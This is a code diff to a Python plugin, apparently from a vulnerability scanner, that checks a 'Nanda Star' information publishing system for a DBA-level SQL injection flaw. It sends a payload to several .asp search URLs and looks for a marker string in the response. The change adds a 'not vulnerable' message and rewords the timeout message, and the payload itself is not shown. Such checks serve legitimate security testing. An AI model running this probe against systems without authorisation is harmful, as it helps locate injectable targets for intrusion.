@@ -27,14 +27,18 @@ class ndstar_six_sqli_BaseVerify:
                 "/pub/search/search_video_bc.asp?id=12",
                 "/pub/search/search_video_view.asp?id=3"]
         try:
+            noexist = True
             for turl in urls:
                 vulnurl = self.url + turl + payload
                 req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
                 if r"WtFaBcMicrosoft" in req.text:
                     cprint("[+]存在南大之星信息发布系统DBA SQL注入漏洞...(高危)\tpayload: "+vulnurl, "red")
+                    noexist = False
+            if noexist:
+                cprint("[-]不存在ndstar_six_sqli漏洞", "white", "on_grey")
 
         except:
-            cprint("[-] "+__file__+"====>连接超时", "cyan")
+            cprint("[-] "+__file__+"====>可能不存在漏洞", "cyan")
 
 if __name__ == "__main__":
     warnings.filterwarnings("ignore")
